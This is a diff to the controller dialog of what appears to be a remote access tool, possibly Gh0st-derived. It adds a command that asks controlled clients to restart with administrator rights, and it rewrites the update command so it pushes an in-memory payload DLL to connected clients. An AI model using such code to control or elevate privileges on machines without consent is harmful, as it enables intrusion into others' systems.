@@ -311,6 +311,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::I
 	m_bmOnline[11].LoadBitmap(IDB_BITMAP_UNAUTH);
 	m_bmOnline[12].LoadBitmap(IDB_BITMAP_ASSIGNTO);
 	m_bmOnline[13].LoadBitmap(IDB_BITMAP_ADDWATCH);
+	m_bmOnline[14].LoadBitmap(IDB_BITMAP_ADMINRUN);
 
 	for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
 		m_ServerDLL[i] = nullptr;
@@ -430,6 +431,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_NOTIFY(NM_CUSTOMDRAW, IDC_MESSAGE, &CMy2015RemoteDlg::OnNMCustomdrawMessage)
 	ON_COMMAND(ID_ONLINE_ADD_WATCH, &CMy2015RemoteDlg::OnOnlineAddWatch)
 	ON_NOTIFY(NM_CUSTOMDRAW, IDC_ONLINE, &CMy2015RemoteDlg::OnNMCustomdrawOnline)
+	ON_COMMAND(ID_ONLINE_RUN_AS_ADMIN, &CMy2015RemoteDlg::OnOnlineRunAsAdmin)
 END_MESSAGE_MAP()
 
 
@@ -1298,6 +1300,7 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 	Menu.SetMenuItemBitmaps(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND, &m_bmOnline[11], &m_bmOnline[11]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_ASSIGN_TO, MF_BYCOMMAND, &m_bmOnline[12], &m_bmOnline[12]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_ADD_WATCH, MF_BYCOMMAND, &m_bmOnline[13], &m_bmOnline[13]);
+	Menu.SetMenuItemBitmaps(ID_ONLINE_RUN_AS_ADMIN, MF_BYCOMMAND, &m_bmOnline[14], &m_bmOnline[14]);
 
 	std::string masterHash(GetMasterHash());
 	if (GetPwdHash() != masterHash || m_superPass.empty()) {
@@ -1353,58 +1356,21 @@ void CMy2015RemoteDlg::OnOnlineMessage()
 	SendSelectedCommand(&bToken, sizeof(BYTE));
 }
 
-char* ReadFileToMemory(const CString& filePath, ULONGLONG &fileSize) {
-	fileSize = 0;
-	try {
-		// 打开文件（只读模式）
-		CFile file(filePath, CFile::modeRead | CFile::typeBinary);
-
-		// 获取文件大小
-		fileSize = file.GetLength();
-
-		// 分配内存缓冲区: 头+文件大小+文件内容
-		char* buffer = new char[1 + sizeof(ULONGLONG) + static_cast<size_t>(fileSize) + 1];
-		if (!buffer) {
-			return NULL;
-		}
-		memcpy(buffer+1, &fileSize, sizeof(ULONGLONG));
-		// 读取文件内容到缓冲区
-		file.Read(buffer + 1 + sizeof(ULONGLONG), static_cast<UINT>(fileSize));
-		buffer[1 + sizeof(ULONGLONG) + fileSize] = '\0'; // 添加字符串结束符
-
-		// 释放内存
-		return buffer;
-	}
-	catch (CFileException* e) {
-		// 捕获文件异常
-		TCHAR errorMessage[256];
-		e->GetErrorMessage(errorMessage, 256);
-		e->Delete();
-		return NULL;
-	}
-
-}
-
 void CMy2015RemoteDlg::OnOnlineUpdate()
 {
 	if (IDYES != MessageBox(_T("确定升级选定的被控程序吗?\n需受控程序支持方可生效!"), 
 		_T("提示"), MB_ICONQUESTION | MB_YESNO))
 		return;
 
-	char path[_MAX_PATH], * p = path;
-	GetModuleFileNameA(NULL, path, sizeof(path));
-	while (*p) ++p;
-	while ('\\' != *p) --p;
-	strcpy(p + 1, "ServerDll.dll");
-	ULONGLONG fileSize = 0;
-	char *buffer = ReadFileToMemory(path, fileSize);
+	Buffer* buf = m_ServerDLL[PAYLOAD_DLL_X64];
+	ULONGLONG fileSize = buf->length(true) - 6;
+	PBYTE buffer = new BYTE[fileSize + 9];
 	if (buffer) {
 		buffer[0] = COMMAND_UPDATE;
-		SendSelectedCommand((PBYTE)buffer, 1 + sizeof(ULONGLONG) + fileSize + 1);
+		memcpy(buffer + 1, &fileSize, 8);
+		memcpy(buffer + 9, buf->c_str() + 6, fileSize);
+		SendSelectedCommand((PBYTE)buffer, 9 + fileSize);
 		delete[] buffer;
-	}
-	else {
-		MessageBox("读取文件失败: "+ CString(path), "提示");
 	}
 }
 
@@ -1614,8 +1580,13 @@ VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
 		context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
 		if (!ContextObject->IsLogin() && szBuffer[0] != COMMAND_BYE)
 			continue;
-
-		// 发送获得驱动器列表数据包
+		if (szBuffer[0] == COMMAND_UPDATE) {
+			CString data = ContextObject->GetClientData(ONLINELIST_CLIENTTYPE);
+			if (data == "SC" || data == "MDLL") {
+				ContextObject->Send2Client(szBuffer, 1);
+				continue;
+			}
+		}
 		ContextObject->Send2Client(szBuffer, ulLength);
 	} 
 	LeaveCriticalSection(&m_cs);
@@ -3110,5 +3081,22 @@ void CMy2015RemoteDlg::OnNMCustomdrawOnline(NMHDR* pNMHDR, LRESULT* pResult)
 		if (r >= 2) pLVCD->clrText = RGB(255, 0, 0); // 字体红
 		if (r >= 3) pLVCD->clrTextBk = RGB(255, 160, 160); // 背景红
 	}
+	}
+}
+
+
+void CMy2015RemoteDlg::OnOnlineRunAsAdmin()
+{
+	if (MessageBoxA("确定要以管理员权限重新启动目标应用程序吗?\n此操作可能触发 UAC 账户控制。",
+		"提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
+		EnterCriticalSection(&m_cs);
+		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+		while (Pos) {
+			int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
+			context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+			BYTE token = CMD_RUNASADMIN;
+			ContextObject->Send2Client(&token, sizeof(token));
+		}
+		LeaveCriticalSection(&m_cs);
 	}
 }
